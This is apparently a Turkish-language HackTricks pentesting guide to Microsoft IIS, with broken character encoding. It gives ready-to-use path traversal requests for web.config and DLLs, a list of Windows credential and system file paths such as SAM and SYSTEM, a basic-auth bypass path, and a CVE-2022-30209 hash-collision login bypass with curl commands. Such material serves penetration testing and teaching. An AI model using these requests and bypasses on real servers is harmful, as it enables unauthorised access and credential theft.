# IIS - Internet Information Services

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

Test edilebilir dosya uzantÄ±larÄ±:

* asp
* aspx
* config
* php

## Dahili IP Adresi ifÅŸasÄ±

302 aldÄ±ÄŸÄ±nÄ±z herhangi bir IIS sunucusunda, Host baÅŸlÄ±ÄŸÄ±nÄ± kaldÄ±rmayÄ± deneyebilir ve HTTP/1.0 kullanabilirsiniz; yanÄ±tta Location baÅŸlÄ±ÄŸÄ± size dahili IP adresine iÅŸaret edebilir:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Ä°Ã§ IP'yi ifÅŸa eden yanÄ±t:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rma

.config dosyalarÄ±nÄ± yÃ¼kleyebilir ve bunlarÄ± kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabilirsiniz. Bunu yapmanÄ±n bir yolu, dosyanÄ±n sonuna bir HTML yorumu iÃ§inde kod eklemektir: [Ã–rneÄŸi buradan indirin](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± istismar etmek iÃ§in daha fazla bilgi ve teknikler [burada](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) bulunmaktadÄ±r.

## IIS KeÅŸif Bruteforce

OluÅŸturduÄŸum listeyi indirin:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

AÅŸaÄŸÄ±daki listelerin iÃ§eriklerini birleÅŸtirerek oluÅŸturuldu:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Bunu herhangi bir uzantÄ± eklemeden kullanÄ±n, gerekli olan dosyalar zaten buna sahiptir.

## Yol Traversal

### Kaynak kodunun sÄ±zdÄ±rÄ±lmasÄ±

Tam yazÄ±mÄ± kontrol edin: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Ã–zetle, uygulamanÄ±n klasÃ¶rlerinde "**assemblyIdentity**" dosyalarÄ±na ve "**namespaces**" referanslarÄ±na sahip birkaÃ§ web.config dosyasÄ± bulunmaktadÄ±r. Bu bilgilerle **Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyalarÄ±n nerede bulunduÄŸunu** bilmek ve bunlarÄ± indirmek mÃ¼mkÃ¼ndÃ¼r.\
**Ä°ndirilen Dll'lerden** yeni **namespaces** bulmak ve bunlara eriÅŸmeye Ã§alÄ±ÅŸmak iÃ§in web.config dosyasÄ±nÄ± almak da mÃ¼mkÃ¼ndÃ¼r.\
AyrÄ±ca, **connectionstrings.config** ve **global.asax** dosyalarÄ± ilginÃ§ bilgiler iÃ§erebilir.\\
{% endhint %}

**.Net MVC uygulamalarÄ±nda**, **web.config** dosyasÄ±, uygulamanÄ±n baÄŸÄ±mlÄ± olduÄŸu her ikili dosyayÄ± **"assemblyIdentity"** XML etiketleri aracÄ±lÄ±ÄŸÄ±yla belirterek kritik bir rol oynar.

### **Ä°kili DosyalarÄ± KeÅŸfetme**

**web.config** dosyasÄ±na eriÅŸim Ã¶rneÄŸi aÅŸaÄŸÄ±da gÃ¶sterilmiÅŸtir:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Bu istek, aÅŸaÄŸÄ±daki gibi Ã§eÅŸitli ayarlarÄ± ve baÄŸÄ±mlÄ±lÄ±klarÄ± ortaya Ã§Ä±karÄ±r:

* **EntityFramework** sÃ¼rÃ¼mÃ¼
* Web sayfalarÄ±, istemci doÄŸrulamasÄ± ve JavaScript iÃ§in **AppSettings**
* Kimlik doÄŸrulama ve Ã§alÄ±ÅŸma zamanÄ± iÃ§in **System.web** yapÄ±landÄ±rmalarÄ±
* **System.webServer** modÃ¼l ayarlarÄ±
* **Microsoft.Owin**, **Newtonsoft.Json** ve **System.Web.Mvc** gibi birÃ§ok kÃ¼tÃ¼phane iÃ§in **Runtime** derleme baÄŸlamalarÄ±

Bu ayarlar, **/bin/WebGrease.dll** gibi belirli dosyalarÄ±n uygulamanÄ±n /bin klasÃ¶rÃ¼nde bulunduÄŸunu gÃ¶sterir.

### **KÃ¶k Dizin DosyalarÄ±**

KÃ¶k dizinde bulunan **/global.asax** ve hassas ÅŸifreler iÃ§eren **/connectionstrings.config** gibi dosyalar, uygulamanÄ±n yapÄ±landÄ±rmasÄ± ve Ã§alÄ±ÅŸmasÄ± iÃ§in gereklidir.

### **Ad AlanlarÄ± ve Web.Config**

MVC uygulamalarÄ±, her dosyada tekrarlayan bildirimlerden kaÃ§Ä±nmak iÃ§in belirli ad alanlarÄ± iÃ§in ek **web.config dosyalarÄ±** tanÄ±mlar; bu, baÅŸka bir **web.config** indirme isteÄŸi ile gÃ¶sterilmiÅŸtir:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL'leri Ä°ndirme**

Ã–zel bir ad alanÄ±nÄ±n belirtilmesi, /bin dizininde bulunan "**WebApplication1**" adlÄ± bir DLL'ye iÅŸaret eder. Bunu takiben, **WebApplication1.dll** indirmek iÃ§in bir istek gÃ¶sterilmektedir:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Bu, /bin dizininde **System.Web.Mvc.dll** ve **System.Web.Optimization.dll** gibi diÄŸer Ã¶nemli DLL'lerin varlÄ±ÄŸÄ±nÄ± Ã¶nerir.

Bir DLL'nin **WebApplication1.Areas.Minded** adlÄ± bir ad alanÄ±nÄ± iÃ§e aktardÄ±ÄŸÄ± bir senaryoda, bir saldÄ±rgan, /bin klasÃ¶rÃ¼ndeki diÄŸer DLL'lere Ã¶zel yapÄ±landÄ±rmalar ve referanslar iÃ§eren, **/area-name/Views/** gibi Ã¶ngÃ¶rÃ¼lebilir yollarla baÅŸka web.config dosyalarÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir. Ã–rneÄŸin, **/Minded/Views/web.config** isteÄŸi, baÅŸka bir DLL'nin, **WebApplication1.AdditionalFeatures.dll** varlÄ±ÄŸÄ±nÄ± gÃ¶steren yapÄ±landÄ±rmalarÄ± ve ad alanlarÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±karabilir.

### YaygÄ±n dosyalar

[Buradan](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 HatasÄ±

EÄŸer aÅŸaÄŸÄ±daki gibi bir hata gÃ¶rÃ¼yorsanÄ±z:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Bu, sunucunun **Host baÅŸlÄ±ÄŸÄ± iÃ§inde doÄŸru alan adÄ±nÄ± almadÄ±ÄŸÄ±** anlamÄ±na gelir.\
Web sayfasÄ±na eriÅŸmek iÃ§in sunulan **SSL SertifikasÄ±na** bakabilir ve belki orada alan/ad alanÄ± adÄ±nÄ± bulabilirsiniz. EÄŸer orada yoksa, doÄŸru olanÄ± bulana kadar **VHosts brute force** yapmanÄ±z gerekebilir.

## BakÄ±lmasÄ± gereken eski IIS zafiyetleri

### Microsoft IIS tilde karakteri â€œ\~â€ Zafiyeti/Ã–zelliÄŸi â€“ KÄ±sa Dosya/KlasÃ¶r AdÄ± SÄ±zdÄ±rma

Bu **teknik** ile her keÅŸfedilen klasÃ¶rÃ¼n iÃ§inde **klasÃ¶rleri ve dosyalarÄ± listelemeyi** deneyebilirsiniz (temel kimlik doÄŸrulama gerektirse bile).\
Bu tekniÄŸin ana sÄ±nÄ±rlamasÄ±, sunucu zayÄ±fsa, **her dosya/klasÃ¶rÃ¼n adÄ±nÄ±n ilk 6 harfini ve dosyalarÄ±n uzantÄ±sÄ±nÄ±n ilk 3 harfini** bulabilmesidir.

Bu zafiyeti test etmek iÃ§in [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) kullanabilirsiniz:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Orijinal araÅŸtÄ±rma: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

AyrÄ±ca **metasploit** kullanabilirsiniz: `use scanner/http/iis_shortname_scanner`

### Temel Kimlik DoÄŸrulama atlatma

**Atlatma** bir temel kimlik doÄŸrulama (**IIS 7.5**) eriÅŸmeye Ã§alÄ±ÅŸarak: `/admin:$i30:$INDEX_ALLOCATION/admin.php` veya `/admin::$INDEX_ALLOCATION/admin.php`

Yeni **klasÃ¶rler** bulmak ve kimlik doÄŸrulamayÄ± **atlatmak** iÃ§in bu **zafiyeti** ve sonuncusunu **karÄ±ÅŸtÄ±rmayÄ±** deneyebilirsiniz.

## ASP.NET Trace.AXD etkin hata ayÄ±klama

ASP.NET, bir hata ayÄ±klama modu iÃ§erir ve dosyasÄ± `trace.axd` olarak adlandÄ±rÄ±lÄ±r.

Bu, bir uygulamaya yapÄ±lan tÃ¼m isteklerin Ã§ok ayrÄ±ntÄ±lÄ± bir kaydÄ±nÄ± tutar.

Bu bilgi, uzak istemci IP'leri, oturum kimlikleri, tÃ¼m istek ve yanÄ±t Ã§erezleri, fiziksel yollar, kaynak kodu bilgileri ve potansiyel olarak kullanÄ±cÄ± adlarÄ± ve ÅŸifreleri iÃ§erir.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Ã‡erezi

ASPXAUTH aÅŸaÄŸÄ±daki bilgileri kullanÄ±r:

* **`validationKey`** (string): imza doÄŸrulama iÃ§in kullanÄ±lacak hex kodlu anahtar.
* **`decryptionMethod`** (string): (varsayÄ±lan â€œAESâ€).
* **`decryptionIV`** (string): hex kodlu baÅŸlatma vektÃ¶rÃ¼ (varsayÄ±lan sÄ±fÄ±r vektÃ¶rÃ¼dÃ¼r).
* **`decryptionKey`** (string): ÅŸifreleme iÃ§in kullanÄ±lacak hex kodlu anahtar.

Ancak, bazÄ± insanlar bu parametrelerin **varsayÄ±lan deÄŸerlerini** kullanacak ve **kullanÄ±cÄ±nÄ±n e-posta adresini Ã§erez olarak** kullanacaktÄ±r. Bu nedenle, ASPXAUTH Ã§erezini kullanan **aynÄ± platformu** kullanan bir web bulursanÄ±z ve saldÄ±rÄ± altÄ±ndaki sunucuda **taklit etmek istediÄŸiniz kullanÄ±cÄ±nÄ±n e-posta adresiyle bir kullanÄ±cÄ± oluÅŸturursanÄ±z**, **ikinci sunucudan Ã§erezi birincisinde kullanma** ÅŸansÄ±nÄ±z olabilir ve kullanÄ±cÄ±yÄ± taklit edebilirsiniz.\
Bu saldÄ±rÄ± bu [**yazÄ±da**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) Ã§alÄ±ÅŸtÄ±.

## Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ ÅŸifrelerle IIS Kimlik DoÄŸrulama Atlatma (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Tam rapor burada](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Kodda bir hata, **kullanÄ±cÄ± tarafÄ±ndan verilen ÅŸifreyi dÃ¼zgÃ¼n bir ÅŸekilde kontrol etmedi**, bu nedenle **ÅŸifre hash'i Ã¶nbellekte** zaten bulunan bir anahtara denk gelen bir saldÄ±rgan, o kullanÄ±cÄ± olarak giriÅŸ yapabilecektir.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
